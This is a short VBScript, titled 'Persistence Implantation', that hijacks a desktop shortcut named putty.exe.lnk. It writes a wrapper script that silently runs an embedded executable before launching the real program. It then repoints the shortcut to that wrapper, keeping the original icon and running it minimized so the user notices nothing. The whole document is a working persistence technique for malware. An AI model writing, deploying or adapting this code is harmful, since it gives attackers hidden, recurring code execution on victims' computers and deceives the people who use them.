' CONFIGURATION
Embed = "c:\Windows Persistent\Embed\embed.exe"
newTarget = "c:\Windows Persistent\Client\putty.vbs"
lnkName = "putty.exe.lnk"

' Helper vars
set WshShell = WScript.CreateObject("WScript.Shell" )
strDesktop = WshShell.SpecialFolders("Desktop" )
set oShellLink = WshShell.CreateShortcut(strDesktop & "\" & lnkName )
origTarget = oShellLink.TargetPath
origArgs = oShellLink.Arguments
origIcon = oShellLink.IconLocation
origDir = oShellLink.WorkingDirectory

' Persistence Implantation
Set FSO = CreateObject("Scripting.FileSystemObject")
Set File = FSO.CreateTextFile(newTarget,True)
File.Write "Set oShell = WScript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
File.Write "oShell.Run " & chr(34) & embed & chr(34) & vbCrLf
File.Write "oShell.Run " & chr(34) & oShellLink.TargetPath & " " & oShellLink.Arguments & chr(34) & vbCrLf
File.Close

oShellLink.TargetPath = newTarget
oShellLink.IconLocation = origTarget & ", 0"
oShellLink.WorkingDirectory = origDir
oShellLink.WindowStyle = 7
oShellLink.Save
